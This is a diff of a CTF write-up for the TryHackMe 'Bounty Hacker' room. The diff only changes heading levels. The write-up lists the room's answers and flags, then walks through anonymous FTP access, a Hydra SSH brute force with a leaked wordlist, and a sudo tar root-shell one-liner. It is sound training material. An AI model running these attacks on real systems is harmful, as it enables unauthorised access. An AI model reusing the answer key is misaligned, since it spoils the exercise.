@@ -6,40 +6,40 @@
 
 <div align="center"> <img alt="Difficulty: Easy" src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-##  Task 1 . Living up to the title.
+###  Task 1 . Living up to the title.
 
-#### Ques 1. Deploy the machine.
+##### Ques 1. Deploy the machine.
 ```
 No need
 ```
-#### Ques 2. Find open ports on the machine
+##### Ques 2. Find open ports on the machine
 ```
 No need
 ```
-#### Ques 3. Who wrote the task list? 
+##### Ques 3. Who wrote the task list? 
 ```
 lin
 ```
-#### Ques 4. What service can you bruteforce with the text file found?
+##### Ques 4. What service can you bruteforce with the text file found?
 ```
 ssh
 ```
-#### Ques 5. What is the users password?
+##### Ques 5. What is the users password?
 ```
 RedDr4gonSynd1cat3
 ```
-#### Ques 6. user.txt
+##### Ques 6. user.txt
 ```
 THM{CR1M3_SyNd1C4T3}
 ```
-#### Ques 7. root.txt
+##### Ques 7. root.txt
 ```
 THM{80UN7Y_h4cK3r}
 ```
 
-# Walkthrough
+## Walkthrough
 
-## 1. Let scan The Ip we got
+### 1. Let scan The Ip we got
 
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
@@ -57,8 +57,8 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 40.49 seconds
 ```
-## 2. Ok so Ftp is open let try to enter with default credentials
-#### Ftp default credentials is ```Anonymous```
+### 2. Ok so Ftp is open let try to enter with default credentials
+##### Ftp default credentials is ```Anonymous```
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ ftp 10.10.67.0       
@@ -70,7 +70,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-### let find something usefull
+#### let find something usefull
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ ftp 10.10.67.0
@@ -90,7 +90,7 @@ ftp: Can't connect to `10.10.67.0:26452': Connection timed out
 226 Directory send OK.
 ftp> 
 ```
-### We get some text file, Let download it to our system
+#### We get some text file, Let download it to our system
 ```
 ftp> get locks.txt
 local: locks.txt remote: locks.txt
@@ -108,7 +108,7 @@ local: task.txt remote: task.txt
 68 bytes received in 00:00 (0.32 KiB/s)
 ftp> 
 ```
-### AS we read First txt-file we have Passwords maybe
+#### AS we read First txt-file we have Passwords maybe
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ cat locks.txt  
@@ -139,7 +139,7 @@ rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
 ```
-### And in Second file We found User
+#### And in Second file We found User
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ cat task.txt 
@@ -148,8 +148,8 @@ ReDSynd1ca7e
 
 -lin
 ```
-## 3. Let Check for Web-directory once, So we dont miss any details,
-### There Are some name present in webpage maybe they are other user
+### 3. Let Check for Web-directory once, So we dont miss any details,
+#### There Are some name present in webpage maybe they are other user
 ```
 ──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ dirsearch -u 10.10.67.0
@@ -189,10 +189,10 @@ Target: http://10.10.67.0/
 
 Task Completed
 ```
-### Nothing much useful
+#### Nothing much useful
 
-## 4. Let Brute Ssh 
-### As we have ```lin``` user and password wordlist so let brute ssh using Hydra
+### 4. Let Brute Ssh 
+#### As we have ```lin``` user and password wordlist so let brute ssh using Hydra
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ hydra -l lin -P locks.txt ssh://10.10.67.0 -V     
@@ -225,7 +225,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-13 16:19:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-13 16:19:49
 ```
-### We got The ssh password let Login
+#### We got The ssh password let Login
 ```
 ┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
 └─$ ssh lin@10.10.67.0                                                                              
@@ -248,7 +248,7 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 lin@bountyhacker:~/Desktop$ 
 ```
-## Let find User.txt
+### Let find User.txt
 ```
 lin@bountyhacker:~/Desktop$ ls
 user.txt
@@ -256,8 +256,8 @@ lin@bountyhacker:~/Desktop$ cat user.txt
 THM{CR1M3_SyNd1C4T3}
 lin@bountyhacker:~/Desktop$ 
 ```
-### That was easy 
-## 5. Privilege Escalation
+#### That was easy 
+### 5. Privilege Escalation
 ```
 lin@bountyhacker:~/Desktop$ sudo -l
 [sudo] password for lin: 
@@ -268,7 +268,7 @@ User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 lin@bountyhacker:~/Desktop$
 ```
-### OK Let Find it on gtfobins
+#### OK Let Find it on gtfobins
 
 ```
 https://gtfobins.github.io/gtfobins/tar/
@@ -278,7 +278,7 @@ https://gtfobins.github.io/gtfobins/tar/
 <img src="https://github.com/user-attachments/assets/0049f4d7-e98c-4688-9a86-0d20e2759e71" height="400"></img>
 </div>
 
-### Ok Let copy all 
+#### Ok Let copy all 
 ```
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
@@ -289,7 +289,7 @@ tar: Removing leading `/' from member names
 root
 #
 ```
-## We Got root
+### We Got root
 ```
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
@@ -302,5 +302,5 @@ root.txt
 THM{80UN7Y_h4cK3r}
 #  
 ```
-## Done 
-# 😄
+### Done 
+## 😄
